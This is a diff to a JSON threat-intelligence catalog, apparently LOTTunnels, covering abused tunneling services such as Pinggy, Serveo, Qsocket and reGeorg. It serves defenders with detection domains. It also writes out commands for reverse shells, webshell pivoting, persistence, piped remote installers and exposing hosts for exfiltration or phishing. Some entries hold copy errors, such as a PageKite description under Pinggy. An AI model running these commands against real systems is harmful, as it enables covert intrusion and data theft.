+        "OperatingSystem": "Linux, MacOS"
+      },
+      {
+        "Command": "opentunnel route add @ <HOST>:<PORT>",
+        "Description": "Routes the tunnel's root hostname (<id>.opentunnel.xyz) to an arbitrary host and port reachable from the machine, such as another internal system.",
+        "Usecase": "Exposing internal network services through a compromised host.",
+        "Category": "Access",
+        "Privileges": "User",
+        "OperatingSystem": "Linux, MacOS"
+      },
+      {
+        "Command": "opentunnel up",
+        "Description": "Creates the tunnel if needed and starts the background service. Where available it registers as a systemd user service (opentunnel-<profile>.service) or launchd agent (xyz.opentunnel.<profile>) that starts at login.",
+        "Usecase": "Persistent tunnel that survives logoff and reboot.",
+        "Category": "Persistence",
+        "Privileges": "User",
+        "OperatingSystem": "Linux, MacOS"
+      },
+      {
+        "Command": "opentunnel serve",
+        "Description": "Runs the tunnel in the foreground instead of as a registered service, for containers or environments without systemd/launchd.",
+        "Usecase": "Running a tunnel inside a container or without leaving a service registration.",
+        "Category": "Access",
+        "Privileges": "User",
+        "OperatingSystem": "Linux, MacOS"
+      }
+    ],
+    "Custom_Domain_Supported": false,
+    "Full_Path": [
+      {
+        "Path": "~/.config/opentunnel/<profile>.toml"
+      },
+      {
+        "Path": "~/.local/share/opentunnel/<profile>/"
+      },
+      {
+        "Path": "~/.local/state/opentunnel/<profile>/daemon.log"
+      },
+      {
+        "Path": "$XDG_RUNTIME_DIR/opentunnel/<profile>.sock"
+      },
+      {
+        "Filename": "opentunnel"
+      }
+    ],
+    "Detection": [
+      {
+        "Domain": "opentunnel.xyz"
+      },
+      {
+        "Domain": "*.opentunnel.xyz"
+      },
+      {
+        "Command": "Execution of the opentunnel binary with route, up or serve arguments."
+      },
+      {
+        "Command": "Creation of an opentunnel-<profile>.service systemd unit or xyz.opentunnel.<profile> launchd agent."
+      }
+    ],
+    "Resources": [
+      {
+        "Link": "https://opentunnel.xyz/"
+      },
+      {
+        "Link": "https://github.com/anomalyco/opentunnel"
+      },
+      {
+        "Link": "https://github.com/anomalyco/opentunnel/tree/master/packages/cli"
+      }
+    ],
+    "source_file": "opentunnel.md",
+    "url": "https://lottunnels.github.io/lottunnels/opentunnel"
+  },
+  {
+    "Name": "Packetriot",
+    "Description": "Packetriot (pktriot) is a tunneling service that exposes local HTTP, TCP and UDP services behind NAT or a firewall to the internet through Packetriot edge servers, reachable via assigned *.pktriot.net hostnames (edge servers use *.packetriot.net) or a custom domain. It has been observed being abused by threat actors, including in XWorm campaigns, to expose command-and-control and internal services without configuring port forwarding.",
+    "Author": "cyberbuff",
+    "Created": "2026-09-17",
+    "Commands": [
+      {
+        "Command": "pktriot start",
+        "Description": "Starts the Packetriot client using the configured tunnel, exposing the local service to the internet through a Packetriot edge server. The client is authenticated with an account token and the edge host is assigned as a *.packetriot.net address.",
+        "Usecase": "Quick execution of Packetriot to expose a local service.",
+        "Category": "Access",
+        "Privileges": "User",
+        "OperatingSystem": "Windows, Linux, MacOS"
+      },
+      {
+        "Command": "pktriot http 8080",
+        "Description": "Exposes a local HTTP service listening on port 8080 through the Packetriot edge, returning a public *.pktriot.net URL.",
+        "Usecase": "Exposing a local web service over the internet for access or data exfiltration.",
+        "Category": "Exfiltrate",
+        "Privileges": "User",
+        "OperatingSystem": "Windows, Linux, MacOS"
+      },
+      {
+        "Command": "pktriot tunnel tcp --destination 127.0.0.1 --dport 22",
+        "Description": "Forwards a public TCP port on the Packetriot edge to a local service such as SSH, giving remote access to a host behind NAT or a firewall.",
+        "Usecase": "Maintaining remote access to an internal host.",
+        "Category": "Access",
+        "Privileges": "User",
+        "OperatingSystem": "Windows, Linux, MacOS"
+      }
+    ],
+    "Custom_Domain_Supported": true,
+    "Full_Path": [
+      {
+        "Path": "Downloaded/Installed version of the pktriot binary, which gets executed anywhere on the system."
+      }
+    ],
+    "Detection": [
+      {
+        "Domain": "*.packetriot.net"
+      },
+      {
+        "Domain": "*.pktriot.net"
+      },
+      {
+        "Command": "Execution of the pktriot binary and/or with arguments."
+      }
+    ],
+    "Resources": [
+      {
+        "Link": "https://packetriot.com/"
+      },
+      {
+        "Link": "https://packetriot.com/docs"
+      },
+      {
+        "Link": "https://www.trendmicro.com/vinfo/us/security/news/cybercrime-and-digital-threats/how-cybercriminals-abuse-cloud-tunneling-services"
+      },
+      {
+        "Link": "https://cert.pl/en/posts/2023/10/deworming-the-xworm/"
+      }
+    ],
+    "source_file": "packetriot.md",
+    "url": "https://lottunnels.github.io/lottunnels/packetriot"
+  },
+  {
+    "Name": "PageKite",
+    "Description": "PageKite is a fast, reliable localhost tunneling solution which is paid but allows a free version for 1 month. This can be abused by the threat actors as well as insiders to expose local apps, services over the internet as well as to download malicious binaries, host malware and to host phishing sites to target users.",
+    "Author": "Kamran Saifullah",
+    "Created": "2024-10-14",
+    "Commands": [
+      {
+        "Command": "curl -O https://pagekite.net/pk/pagekite.py",
+        "Description": "PageKite allows to download a python program which can be called directly from the URL and can be executed on the local machine.",
+        "Usecase": "Downloading and execution of pagekite python program.",
+        "Category": "install",
+        "Privileges": "User",
+        "OperatingSystem": "Windows, Mac, Linux"
+      },
+      {
+        "Command": "pagekite.py <LOCAL PATH> <SUBDOMAIN>.pagekite.me",
+        "Description": "Exposing local file system over the internet for data exfiltration.",
+        "Usecase": "Hosting local file system and binding them to the PageKite domains for data exfiltration.",
+        "Category": "exfiltrate",
+        "Privileges": "User",
+        "OperatingSystem": "Windows, Mac, Linux"
+      },
+      {
+        "Command": "pagekite.py <PORT> <SUBDOMAIN>.pagekite.me",
+        "Description": "Exposing local services over the internet for external access.",
+        "Usecase": "Hosting local services and binding them to the PageKite domains for external access.",
+        "Category": "access",
+        "Privileges": "User",
+        "OperatingSystem": "Windows, Mac, Linux"
+      },
+      {
+        "Command": "pagekite.py <PORT> <SUBDOMAIN>.pagekite.me",
+        "Description": "Exposing local ssh/rdp over PageKite domains for shell-access.",
+        "Usecase": "Hosting local services i.e. SSH/RDP etc. for shell access.",
+        "Category": "shell-access",
+        "Privileges": "User",
+        "OperatingSystem": "Windows, Mac, Linux"
+      },
+      {
+        "Command": "pagekite.py <PORT> <SUBDOMAIN>.pagekite.me",
+        "Description": "Hosting phishing pages locally and exposing them via PageKite subdomains to target users.",
+        "Usecase": "Hosting phishing pages locally by threat actors and using the PageKite domains to target the users.",
+        "Category": "phishing",
+        "Privileges": "User",
+        "OperatingSystem": "Windows, Mac, Linux"
+      },
+      {
+        "Command": "pagekite.py <LOCAL PATH> <SUBDOMAIN>.pagekite.me",
+        "Description": "Hosting malicious files/confidential files via a local path and exposing them over PageKite domains for download.",
+        "Usecase": "Hosting local files, malicious files, sensitive files and exposing them over PageKite domains for downloads.",
+        "Category": "download",
+        "Privileges": "User",
+        "OperatingSystem": "Windows, Mac, Linux"
+      }
+    ],
+    "Full_Path": [
+      {
+        "Path": "Downloaded version of PakeKite python program, which gets executed anywhere on the system."
+      }
+    ],
+    "Detection": [
+      {
+        "Domain": "*.pagekite.net"
+      },
+      {
+        "Domain": "*.pagekite.me"
+      }
+    ],
+    "Resources": [
+      {
+        "Link": "https://pagekite.net/"
+      }
+    ],
+    "Acknowledgement": [
+      {
+        "Person": "Kamran Saifullah",
+        "Handle": "@deFr0ggy"
+      }
+    ],
+    "source_file": "pagekite.md",
+    "url": "https://lottunnels.github.io/lottunnels/pagekite"
+  },
+  {
+    "Name": "Pinggy",
+    "Description": "Pinggy is a fast, versatile, and privacy-focused tunneling solution that enables users to expose local services, files, and ports over the internet. It can be leveraged for legitimate purposes like development, testing, and IoT access, but it may also be misused by threat actors to expose sensitive systems, services, or files for malicious purposes. This can be used with SSh or directly via the provided binary.",
+    "Author": "Kamran Saifullah",
+    "Created": "2024-10-14",
+    "Commands": [
+      {
+        "Command": "wget https://s3.ap-south-1.amazonaws.com/public.pinggy.binaries/v0.1.3/mac/univ/pinggy",
+        "Description": "PageKite provides binarues for multiple operating systems that are not required to be installed on the system as these are standalone binaries.",
+        "Usecase": "Downloading and execution of pagekite python program.",
+        "Category": "Install",
+        "Privileges": "User",
+        "OperatingSystem": "Windows, Mac, Linux"
+      },
+      {
+        "Command": "ssh -p <PORT> -R0:localhost:8000 -L4300:localhost:4300 a.pinggy.io",
+        "Description": "Having a local web server running on the local machine, it is possible to expose the entire file system via pinggy tunnels.",
+        "Usecase": "Exposing local file system over the internet for data exfiltrations.",
+        "Category": "exfiltrate",
+        "Privileges": "User",
+        "OperatingSystem": "Windows, Mac, Linux"
+      },
+      {
+        "Command": "ssh -p <SSH/RDP/ PORT> -R0:localhost:8000 -L4300:localhost:4300 a.pinggy.io",
+        "Description": "Exposing local shell services running on the local machine over the internet for shell access.",
+        "Usecase": "Hosting local services and binding them to pinggy tunnels for shell-access",
+        "Category": "shell-access",
+        "Privileges": "User",
+        "OperatingSystem": "Windows, Mac, Linux"
+      },
+      {
+        "Command": "ssh -p <PORT> -R0:localhost:8000 -L4300:localhost:4300 a.pinggy.io",
+        "Description": "Exposing local serivces/applications running locally and binding them to pinggy domains to be accessed over the internet.",
+        "Usecase": "Hosting local services/applications running locally and exposing them over the internet.",
+        "Category": "access",
+        "Privileges": "User",
+        "OperatingSystem": "Windows, Mac, Linux"
+      },
+      {
+        "Command": "ssh -p <PORT> -R0:localhost:8000 -L4300:localhost:4300 a.pinggy.io",
+        "Description": "Having local files in the directory and exposing them via hosting local web server and binding it to pinggy tunnels will enable threat actors to download malicious binaies onto the compromised host.",
+        "Usecase": "Hosting malicious binaries locally and downloading these over to the compromised host.",
+        "Category": "download",
+        "Privileges": "User",
+        "OperatingSystem": "Windows, Mac, Linux"
+      },
+      {
+        "Command": "ssh -p <PORT>> -R0:localhost:8000 -L4300:localhost:4300 a.pinggy.io",
+        "Description": "Hosting phishing website locally and exposing it over pinggy tunnels to compromise users.",
+        "Usecase": "Threat actors can host phishing sites running on the local server and can expose these over the pinggy tunnels for targeting users.",
+        "Category": "phishing",
+        "Privileges": "User",
+        "OperatingSystem": "Windows, Mac, Linux"
+      }
+    ],
+    "Full_Path": [
+      {
+        "Path": "Downloaded version of pinggy, or directly via SSH."
+      }
+    ],
+    "Detection": [
+      {
+        "Domain": "*.pinggy.io"
+      },
+      {
+        "Domain": "*.pinggy.link"
+      },
+      {
+        "Domain": "*.*.amazonaws.com/public.pinggy.binaries/*"
+      }
+    ],
+    "Resources": [
+      {
+        "Link": "https://pinggy.io/docs/"
+      }
+    ],
+    "Acknowledgement": [
+      {
+        "Person": "Kamran Saifullah",
+        "Handle": "@deFr0ggy"
+      }
+    ],
+    "source_file": "pinggy.md",
+    "url": "https://lottunnels.github.io/lottunnels/pinggy"
+  },
+  {
+    "Name": "PiTunnel",
+    "Description": "PiTunnel is free/subscription based tool which enables connecting local systems to dataplicity cloud for remotely accessing them over the internet.",
+    "Author": "Kamran Saifullah",
+    "Created": "2024-10-14",
+    "Commands": [
+      {
+        "Command": "curl -s https://pitunnel.com/get/<TOKEN> | sudo bash",
+        "Description": "Having an account created on the website, it is possible to connect any system to the PiTunnel cloud and access it remotely, keeping access over tunnels.",
+        "Usecase": "Connecting the user machine to Pitunnl keeping access over tunnels.",
+        "Category": "Access",
+        "Privileges": "User",
+        "OperatingSystem": "RaspberryPi"
+      },
+      {
+        "Command": "wget -qO- https://pitunnel.com/get/<TOKEN>> | sudo",
+        "Description": "Having an account created on the website, it is possible to connect any system to the PiTunnel cloud and access it remotely, for shell-access.",
+        "Usecase": "Connecting the user machine to PiTunnel cloud for data exfiltration.",
+        "Category": "shell-access",
+        "Privileges": "User",
+        "OperatingSystem": "RaspberryPi"
+      },
+      {
+        "Command": "pitunnel --port=<PORT> --name=vnc --persist",
+        "Description": "Having an account created on the website, it is possible to connect any system to the PiTunnel cloud and access it remotely, for data exfiltration.",
+        "Usecase": "Connecting the user machine to PiTunnel cloud for data exfiltration.",
+        "Category": "exfiltrate",
+        "Privileges": "User",
+        "OperatingSystem": "RaspberryPi"
+      }
+    ],
+    "Full_Path": [
+      {
+        "Path": "Execution of pitunnel/bash command from anywhere on the system."
+      }
+    ],
+    "Detection": [
+      {
+        "Domain": "*.pitunnel.com"
+      },
+      {
+        "Command": "Execution of the command."
+      }
+    ],
+    "Resources": [
+      {
+        "Link": "https://www.pitunnel.com/"
+      }
+    ],
+    "Acknowledgement": [
+      {
+        "Person": "Kamran Saifullah",
+        "Handle": "@deFr0ggy"
+      }
+    ],
+    "source_file": "pitunnel.md",
+    "url": "https://lottunnels.github.io/lottunnels/pitunnel"
+  },
+  {
+    "Name": "Portmap.io",
+    "Description": "Portmap.io is a hosted tunneling and port-forwarding service that exposes services behind NAT or a firewall to the internet through *.portmap.io hostnames over an OpenVPN connection. It has been repeatedly observed as attacker infrastructure, providing free *.portmap.io subdomains used as command-and-control endpoints by malware such as Pekraut, LodaRAT and SpyNote, and by APT19/Chimera.",
+    "Author": "cyberbuff",
+    "Created": "2026-09-17",
+    "Commands": [
+      {
+        "Command": "openvpn <config>.ovpn",
+        "Description": "Connects the local host to the Portmap.io network using the OpenVPN configuration downloaded from the Portmap.io dashboard, after which configured mappings forward a public *.portmap.io host and port to a local service.",
+        "Usecase": "Establishing the Portmap.io tunnel to expose a local service.",
+        "Category": "Access",
+        "Privileges": "User",
+        "OperatingSystem": "Windows, Linux, MacOS"
+      },
+      {
+        "Command": "<mapping via dashboard>: 4433 -> 127.0.0.1:4433",
+        "Description": "A port mapping configured in the Portmap.io web dashboard forwards a public port on a *.portmap.io host to a local service, reachable from anywhere on the internet.",
+        "Usecase": "Exposing a local service such as a C2 listener or RAT over the internet.",
+        "Category": "Access",
+        "Privileges": "User",
+        "OperatingSystem": "Windows, Linux, MacOS"
+      }
+    ],
+    "Custom_Domain_Supported": false,
+    "Full_Path": [
+      {
+        "Path": "Uses the standard OpenVPN client with a Portmap.io-issued configuration; mappings are managed in the Portmap.io web dashboard."
+      }
+    ],
+    "Detection": [
+      {
+        "Domain": "*.portmap.io"
+      },
+      {
+        "Domain": "*.portmap.host"
+      },
+      {
+        "Command": "Execution of the OpenVPN client with a Portmap.io configuration file."
+      }
+    ],
+    "Resources": [
+      {
+        "Link": "https://portmap.io/"
+      },
+      {
+        "Link": "https://portmap.io/knowledgebase"
+      }
+    ],
+    "source_file": "portmap.md",
+    "url": "https://lottunnels.github.io/lottunnels/portmap"
+  },
+  {
+    "Name": "Pyjam.as",
+    "Description": "tunnel.pyjam.as can be used as an ephemeral reverse proxy for your local services. This may be useful, for instance when you need to show your friend something cool you've built.",
+    "Author": "Phill Moore",
+    "Created": "2025-04-22",
+    "Commands": [
+      {
+        "Command": "curl https://tunnel.pyjam.as/<PORT> > <CONFIG> && wg-quick up ./<CONFIG>",
+        "Description": "Create tunnel through public service",
+        "Usecase": "Exposing local services/file system over the internet for data exfiltration.",
+        "Category": "Exfiltrate",
+        "Privileges": "User",
+        "OperatingSystem": "Windows, Linux, MacOS"
+      }
+    ],
+    "Custom_Domain_Supported": true,
+    "Full_Path": [
+      {
+        "Path": "Execution via command line using native tools"
+      }
+    ],
+    "Detection": [
+      {
+        "Domain": "*tunnel.pyjam.as*"
+      },
+      {
+        "Domain": "*.tunnel.pyjam.as"
+      }
+    ],
+    "Resources": [
+      {
+        "Link": "https://gitlab.com/pyjam.as/tunnel"
+      }
+    ],
+    "Acknowledgement": [
+      {
+        "Person": "Phill Moore",
+        "Handle": "@randomaccess3"
+      }
+    ],
+    "source_file": "pyjamas.md",
+    "url": "https://lottunnels.github.io/lottunnels/pyjamas"
+  },
+  {
+    "Name": "Qsocket",
+    "Description": "QSocket is a Go port of the Global Socket Toolkit that allows two hosts behind NAT/Firewall to establish an E2E encrypted TCP connection with each other through the Quantum Socket Relay Network (QSRN), using tools such as qs-netcat. Can be abused for reverse shells, port forwarding, SOCKS proxying and data transfer.",
+    "Author": "QSocket (qsocket)",
+    "Created": "2026-08-17",
+    "Commands": [
+      {
+        "Command": "qs-netcat -s MySecret -l -i",
+        "Description": "Server-side of a reverse PTY shell. Spawns a true interactive login shell when a client connects using the same secret.",
+        "Usecase": "Interactive reverse shell access to a host behind NAT/firewall.",
+        "Category": "Access",
+        "Privileges": "User",
+        "OperatingSystem": "Windows, Linux, MacOS"
+      },
+      {
+        "Command": "qs-netcat -s MySecret -i",
+        "Description": "Client-side connection to the qs-netcat listening server, giving a real interactive PTY shell.",
+        "Usecase": "Connecting to a reverse shell hosted behind NAT/firewall.",
+        "Category": "Access",
+        "Privileges": "User",
+        "OperatingSystem": "Windows, Linux, MacOS"
+      },
+      {
+        "Command": "qs-netcat -s MySecret -l -f 192.168.6.7:22",
+        "Description": "Port-forwards connections to 192.168.6.7:22 on the server's private network via the QSRN.",
+        "Usecase": "Reach an internal host/service on a NAT'd network.",
+        "Category": "Access",
+        "Privileges": "User",
+        "OperatingSystem": "Windows, Linux, MacOS"
+      }
+    ],
+    "Full_Path": [
+      {
+        "Filename": "qs-proxy"
+      }
+    ],
+    "Detection": [
+      {
+        "Domain": "*.qsocket.io"
+      },
+      {
+        "Command": "Execution of qs-netcat/qs-lite/qs-proxy binaries, including with -s <secret>, -l, -i, -e or -f arguments."
+      }
+    ],
+    "Resources": [
+      {
+        "Link": "https://qsocket.io/"
+      },
+      {
+        "Link": "https://github.com/qsocket/qsocket"
+      },
+      {
+        "Link": "https://github.com/qsocket/qs-netcat"
+      }
+    ],
+    "Acknowledgement": [
+      {
+        "Person": "Jeffrey Tigchelaar-Moerbeek"
+      }
+    ],
+    "source_file": "qsocket.md",
+    "url": "https://lottunnels.github.io/lottunnels/qsocket"
+  },
+  {
+    "Name": "reGeorg",
+    "Description": "reGeorg is the successor to reDuh, a self-hosted pivoting tool that uploads a tunnel webshell (tunnel.aspx/ashx/jsp/php) to a compromised, internet-facing web server and opens a local SOCKS proxy on the operator's machine that relays traffic through it into the DMZ or internal network. Because the operator controls the compromised server, there is no vendor domain to block. It is heavily abused for tunneling into segmented networks over legitimate-looking web traffic, tracked as MITRE ATT&CK S1187 and observed with SamSam and Exchange server intrusions, among others.",
+    "Author": "cyberbuff",
+    "Created": "2026-09-22",
+    "Commands": [
+      {
+        "Command": "python reGeorgSocksProxy.py -p 8080 -u http://<TARGET>/tunnel/tunnel.jsp",
+        "Description": "Runs the reGeorg client, opening a local SOCKS proxy on port 8080 that relays traffic through the tunnel webshell hosted on the compromised web server.",
+        "Usecase": "Pivoting into an internal network through a compromised, internet-facing web server.",
+        "Category": "Access",
+        "Privileges": "User",
+        "OperatingSystem": "Windows, Linux, MacOS"
+      }
+    ],
+    "Custom_Domain_Supported": true,
+    "Full_Path": [
+      {
+        "Path": "reGeorgSocksProxy.py client script executed on the operator host, plus a tunnel.(aspx|ashx|jsp|php) webshell uploaded to the compromised web server."
+      }
+    ],
+    "Detection": [
+      {
+        "Command": "Execution of reGeorgSocksProxy.py with -u pointing at a tunnel webshell, and the presence of tunnel.aspx/tunnel.ashx/tunnel.jsp/tunnel.php (including tunnel.nosocket.php) webshell files on a web server."
+      }
+    ],
+    "Resources": [
+      {
+        "Link": "https://github.com/sensepost/reGeorg"
+      },
+      {
+        "Link": "https://attack.mitre.org/software/S1187/"
+      }
+    ],
+    "source_file": "regeorg.md",
+    "url": "https://lottunnels.github.io/lottunnels/regeorg"
+  },
+  {
+    "Name": "Serveo",
+    "Description": "Serveo is an online free alternate to ngrok. Which can be used by the insiders as well as threat actors to expose local systems, services over the internet for data exfiltrations, downloading malicious softwares as well as hosting phishing pages.",
+    "Author": "Kamran Saifullah",
+    "Created": "2024-10-13",
+    "Commands": [
+      {
+        "Command": "ssh -R <PORT>:localhost:<PORT> serveo.net",
+        "Description": "The command creates a tunnel via serveo to the local port provided in the command. This can be a local service or a web server running locally.",
+        "Usecase": "Exposing local services/file system over the internet for data exfiltration.",
+        "Category": "exfiltrate",
+        "Privileges": "User",
+        "OperatingSystem": "Windows, Mac, Linux"
+      },
+      {
+        "Command": "wget *.serveo.net",
+        "Description": "Threat actors can host malicious binaries on the local system and expose it via serveo.net and have those downloaded on the compromised host.",
+        "Usecase": "Serving malicious binaries to be executed/downloaded on the compromised host.",
+        "Category": "download",
+        "Privileges": "User",
+        "OperatingSystem": "Windows, Mac, Linux"
+      },
+      {
+        "Command": "ssh -R <PORT>:localhost:<PORT> serveo.net",
+        "Description": "Threat actors can host phishing sites locally and can expose them via serveo.net to compromise users.",
+        "Usecase": "Hosting phishing site locally and exposing it via serveo.net",
+        "Category": "phishing",
+        "Privileges": "User",
+        "OperatingSystem": "Windows, Mac, Linux"
+      },
+      {
+        "Command": "autossh -M 0 -R <PORT>:localhost:<PORT> serveo.net",
+        "Description": "Threat actors enabling persistence on the compromised host to ensure system automatically gets connected to the serveo.net and can also provide shell access by exposing SSH/RDP etc.",
+        "Usecase": "Persisting local connections over serveo.net and/or exposing SSH/RDP for persistence.",
+        "Category": "shell-access",
+        "Privileges": "User",
+        "OperatingSystem": "Windows, Mac, Linux"
+      }
+    ],
+    "Full_Path": [
+      {
+        "Path": "Execution via command line. No need of installation."
+      }
+    ],
+    "Detection": [
+      {
+        "Domain": "*.serveo.net"
+      }
+    ],
+    "Resources": [
+      {
+        "Link": "https://serveo.net/"
+      }
+    ],
+    "Acknowledgement": [
+      {
+        "Person": "Kamran Saifullah",
+        "Handle": "@deFr0ggy"
+      }
+    ],
+    "source_file": "serveo.md",
+    "url": "https://lottunnels.github.io/lottunnels/serveo"
+  },
+  {
+    "Name": "Expose",
+    "Description": "Expose is an open source as well as subscription based tool which enables local services/applications to be exposed over the internet. Insiders as well as threat actors can use this tool to perform variety of malicious tasks. Although, the tool requires an authentication token of which free token can be obtained from the website.",
+    "Author": "Kamran Saifullah",
+    "Created": "2024-10-13",
+    "Commands": [
+      {
+        "Command": "curl https://github.com/beyondcode/expose/raw/master/builds/expose -L --output expose",
+        "Description": "Downloading and Installation of expose binary on the local system as a PHAR archive.",
+        "Usecase": "Downloading the expose binary to be executed on the local machine.",
+        "Category": "install",
+        "Privileges": "User",
+        "OperatingSystem": "Windows, Mac, Linux"
+      },
+      {
+        "Command": "composer global require beyondcode/expose",
+        "Description": "Downloading and Installation of expose binary on the local system.",
+        "Usecase": "Downloading the expose binary to be executed on the local machine via composer.",
+        "Category": "install",
+        "Privileges": "User",
+        "OperatingSystem": "Windows, Mac, Linux"
+      },
+      {
+        "Command": "expose token <token>",
+        "Description": "Initiating the access via providing expose token.",
+        "Usecase": "Authenticating the session via expose token.",
+        "Category": "access",
+        "Privileges": "User",
+        "OperatingSystem": "Windows, Mac, Linux"
+      },
+      {
+        "Command": "expose default-server ap-1",
+        "Description": "Setting up default server via expose to connect to the nearest expose server.",
+        "Usecase": "Connecting to the nearest expoe server for better bandwidth and connection stability.",
+        "Category": "access",
+        "Privileges": "User",
+        "OperatingSystem": "Windows, Mac, Linux"
+      },
+      {
+        "Command": "expose share http://https://localhost:<LOCAL PORT>",
+        "Description": "Exposing the local server/services over the internet to be accessible over expose domains.",
+        "Usecase": "Exposing the services running on localhost over the internet via expose tunnel domains.",
+        "Category": "exfiltrate",
+        "Privileges": "User",
+        "OperatingSystem": "Windows, Mac, Linux"
+      },
+      {
+        "Command": "expose share http://https://localhost:<LOCAL PORT>",
+        "Description": "This can be used by threat actors to host malicious softwares/binaries on their local system and have it exposed via expose tunnels to be downloaded on the compromised system.",
+        "Usecase": "Threat actors hosting malicious binaries and using the links to download them onto the compromised system.",
+        "Category": "download",
+        "Privileges": "User",
+        "OperatingSystem": "Windows, Mac, Linux"
+      },
+      {
+        "Command": "expose share http://https://localhost:<LOCAL PORT>",
+        "Description": "This can be used by threat actors to host phishing sites locally and expose them via expose tunnels to compromise users.",
+        "Usecase": "Hosting phishing sites locally and exposing them over expose tunnels to compromise users.",
+        "Category": "phishing",
+        "Privileges": "User",
+        "OperatingSystem": "Windows, Mac, Linux"
+      },
+      {
+        "Command": "expose share http://https://localhost:<LOCAL PORT> --server=<server>",
+        "Description": "This can be used by threat actors to connect to the nearest expose server.",
+        "Usecase": "Connecting to the nearest expose server in specific regions.",
+        "Category": "access",
+        "Privileges": "User",
+        "OperatingSystem": "Windows, Mac, Linux"
+      }
+    ],
+    "Full_Path": [
+      {
+        "Path": "Installed version of expose binary/docker container, which gets executed anywhere on the system."
+      }
+    ],
+    "Detection": [
+      {
+        "Domain": "*.sharedwithexpose.com"
+      },
+      {
+        "Domain": "*.*.sharedwithexpose.com"
+      },
+      {
+        "Domain": "*.eu-1.sharedwithexpose.com"
+      },
+      {
+        "Domain": "*.us-1.sharedwithexpose.com"
+      },
+      {
+        "Domain": "*.us-2.sharedwithexpose.com"
+      },
+      {
+        "Domain": "*.ap-1.sharedwithexpose.com"
+      },
+      {
+        "Domain": "*.in-1.sharedwithexpose.com"
+      },
+      {
+        "Domain": "*.sa-1.sharedwithexpose.com"
+      },
+      {
+        "Domain": "*.au-1.sharedwithexpose.com"
+      },
+      {
+        "Domain": "*.eu-2.sharedwithexpose.com"
+      },
+      {
+        "Command": "Execution of the binary and/or with arguments."
+      }
+    ],
+    "Resources": [
+      {
+        "Link": "https://expose.dev/docs/getting-started/installation"
+      },
+      {
+        "Link": "https://github.com/beyondcode/expose"
+      }
+    ],
+    "Acknowledgement": [
+      {
+        "Person": "Kamran Saifullah",
+        "Handle": "@deFr0ggy"
+      }
+    ],
+    "source_file": "sharewithexpose.md",
+    "url": "https://lottunnels.github.io/lottunnels/sharewithexpose"
+  },
+  {
+    "Name": "ShellHub",
+    "Description": "ShellHub is an online service/subscription based that enables local services/applications to be exposed over the internet. Insiders as well as threat actors can use this tool to perform variety of malicious tasks. Although, the tool requires an authentication token of which free token can be obtained from the website.",
+    "Author": "Kamran Saifullah",
+    "Created": "2024-10-13",
+    "Commands": [
+      {
+        "Command": "curl -sSf \"https://cloud.shellhub.io/install.sh?tenant_id=<TENANT ID>\" | sh",
+        "Description": "Installating of ShellHub on the local system to be added as an approved device.",
+        "Usecase": "Executing the installation script to install ShellHub on the local system.",
+        "Category": "install",
+        "Privileges": "User",
+        "OperatingSystem": "Mac, Linux"
+      },
+      {
+        "Command": "ShellHub Dashboard",
+        "Description": "Accessing the local system via ShellHub dashboard. Requires to know the username and password or SSH private keys.",
+        "Usecase": "Knowing the credentials or SSH private key, users/threat actors can connect to the local terminal via ShellHub Cloud Terminal.",
+        "Category": "shell-access",
+        "Privileges": "User",
+        "OperatingSystem": "Mac, Linux"
+      }
+    ],
+    "Full_Path": [
+      {
+        "Path": "Installed ShellHub script/docker container, which gets executed anywhere on the system."
+      }
+    ],
+    "Detection": [
+      {
+        "Domain": "*.shellhub.io*"
+      },
+      {
+        "Command": "Execution of the installation command."
+      }
+    ],
+    "Resources": [
+      {
+        "Link": "https://cloud.shellhub.io/"
+      },
+      {
+        "Link": "https://www.shellhub.io/"
+      }
+    ],
+    "Acknowledgement": [
+      {
+        "Person": "Kamran Saifullah",
+        "Handle": "@deFr0ggy"
+      }
+    ],
+    "source_file": "shellhub.md",
+    "url": "https://lottunnels.github.io/lottunnels/shellhub"
+  },
+  {
+    "Name": "Shootback",
+    "Description": "Shootback is a self-hosted reverse TCP tunnel written in Python that lets an operator reach a service on a host behind NAT or a firewall. A slaver runs on the internal host and connects out to an operator-run master, which exposes the tunneled service. Because both ends are operator-run, there is no vendor domain to block. It has been observed in MuddyWater/Seedworm post-exploitation activity.",
+    "Author": "cyberbuff",
+    "Created": "2026-09-17",
+    "Commands": [
+      {
+        "Command": "python master.py -m 0.0.0.0:10000 -c 0.0.0.0:10080",
+        "Description": "Runs the operator-controlled master, listening for slaver connections on one port and exposing the tunneled service to customers on another.",
+        "Usecase": "Standing up the tunnel endpoint that internal hosts connect back to.",
+        "Category": "Access",
+        "Privileges": "User",
+        "OperatingSystem": "Windows, Linux, MacOS"
+      },
+      {
+        "Command": "python slaver.py -m <MASTER_IP>:10000 -t 127.0.0.1:22",
+        "Description": "Runs on the host behind NAT, connecting out to the master and forwarding a local service such as SSH (22) so it becomes reachable through the master.",
+        "Usecase": "Exposing an internal service to the operator through the reverse tunnel.",
+        "Category": "Access",
+        "Privileges": "User",
+        "OperatingSystem": "Windows, Linux, MacOS"
+      }
+    ],
+    "Custom_Domain_Supported": true,
+    "Full_Path": [
+      {
+        "Path": "master.py and slaver.py Python scripts (or PyInstaller-packaged binaries) executed anywhere on the system."
+      }
+    ],
+    "Detection": [
+      {
+        "Command": "Execution of master.py / slaver.py (or packaged equivalents), particularly with -m master and -t target arguments."
+      }
+    ],
+    "Resources": [
+      {
+        "Link": "https://github.com/aploium/shootback"
+      },
+      {
+        "Link": "https://documents.trendmicro.com/assets/white_papers/wp_new_muddywater_findings_uncovered.pdf"
+      }
+    ],
+    "source_file": "shootback.md",
+    "url": "https://lottunnels.github.io/lottunnels/shootback"
+  },
+  {
+    "Name": "SSH-J",
+    "Description": "SSH-J.com is a public SSH jump and port forwarding server powered by dropbear-sshj, a modified Dropbear SSH server. A host behind NAT can publish SSH ports to the public internet by connecting to ssh-j.com with an arbitrary username and a remote-forward specification, then be reached from anywhere via an SSH jump host. Also reachable over a Tor onion service. Published hosts are scoped to the username that created them.",
+    "Author": "ValdikSS",
+    "Created": "2026-08-17",
+    "Commands": [
+      {
+        "Command": "ssh any-username@ssh-j.com -N -R laptop-behind-nat:22:localhost:22",
+        "Description": "Publishes the local SSH server (localhost:22) of a host behind NAT as \"laptop-behind-nat:22\" on the ssh-j.com server, bound to the chosen username.",
+        "Usecase": "Exposes an SSH port of a NAT'd host to the public internet.",
+        "Category": "Access",
+        "Privileges": "User",
+        "OperatingSystem": "Windows, MacOS, Linux"
+      },
+      {
+        "Command": "ssh -J any-username@ssh-j.com laptop-behind-nat",
+        "Description": "Connects to a previously published host (\"laptop-behind-nat\") by jumping through ssh-j.com as the proxy.",
+        "Usecase": "Reaches a published SSH server from anywhere.",
